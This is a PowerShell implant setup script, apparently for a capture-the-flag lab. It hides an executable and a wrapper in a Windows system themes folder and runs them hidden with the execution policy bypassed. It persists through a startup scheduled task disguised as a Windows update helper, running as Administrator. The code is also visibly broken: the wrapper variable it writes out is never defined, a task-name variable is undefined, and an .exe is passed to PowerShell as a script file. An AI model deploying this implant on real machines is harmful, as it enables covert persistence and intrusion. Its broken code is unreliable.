# === Implant Setup Script ===
# Drops challenge wrapper, content, creates scheduled task, and starts immediately

$kaliIP = "172.30.119.180"
$baseURL = "http://${kaliIP}:8080"
$sourceExe     = ".\update.exe"
$taskName      = "WindowsUpdateCheckHelper"
$challengePort = 4444
$meterPort = 5555
$basePath = "C:\Windows\Resources\Ease of Access Themes"
$authToken = "blueswindowmachine"

# Step 1: Move target
if (Test-Path ".\update_check.exe") {
    Move-Item -Path .\update_check.exe -Destination "$basePath" -Force
    Write-Host "[*] exe written to $basePath" -ForegroundColor Yellow
} 

if (Test-Path ".\challenge_wrapper.ps1") {
    Move-Item -Path .\challenge_wrapper.ps1 -Destination "$basePath" -Force
     Write-Host "[*] Wrapper written to $basePath" -ForegroundColor Yellow
}

$contentPath = "$basePath\update_check.exe"
$wrapperPath = "$basePath\challenge_wrapper.ps1"

# === Step 2: Write the wrapper ===
# Double-quoted here-string: bare $vars expand NOW (baked into file as literals).
# Backticked `$vars stay as literal $var in the file (evaluated at wrapper runtime).

$wrapper | Out-File -FilePath $wrapperPath -Encoding ASCII -Force
if (Test-Path $wrapperPath) {
    Write-Host "[*] Wrapper written to $wrapperPath" -ForegroundColor Yellow
} else {
    Write-Host "[!] Failed to write wrapper." -ForegroundColor Red
    exit 1
}

powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \$wrapperPath

# === Step 3: Persistence via scheduled task ===
$taskAction = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File \`"$contentPath\`""

SCHTASKS /CREATE /tn $taskName `
    /tr "$taskAction" `
    /sc ONSTART `
    /ru Administrator /F 
if ($LASTEXITCODE -eq 0) {
    Write-Host "[*] Scheduled task '$taskNameHelper' created." -ForegroundColor Green
} else {
    Write-Host "[!] Scheduled task creation failed (exit $LASTEXITCODE)." -ForegroundColor Red
    exit 1
}

# === Step 4: Kick it off now without waiting for reboot ===
schtasks /run /tn $taskName
Write-Host "[*] Task started. Listener should be live on port $challengePort." -ForegroundColor Green
